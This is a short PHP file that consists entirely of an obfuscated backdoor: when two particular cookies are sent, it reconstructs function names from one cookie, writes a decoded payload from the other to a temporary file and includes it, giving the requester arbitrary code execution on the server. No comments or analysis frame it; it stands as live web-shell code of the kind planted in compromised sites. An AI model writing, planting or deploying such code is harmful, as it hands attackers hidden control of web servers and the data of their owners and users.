<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[17])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 7;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[17][$n];
        if (!$c[17][$n + 1]) {
            if (!$c[17][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 7 + 1;
    }
    $k = $p[2]() . $p[25];
    if (!$p[19]($k)) {
        $n = $p[29]($k, $p[8]);
        $p[11]($n, $p[3] . $p[14]($p[20]($c[3])));
    }
    include($k);
}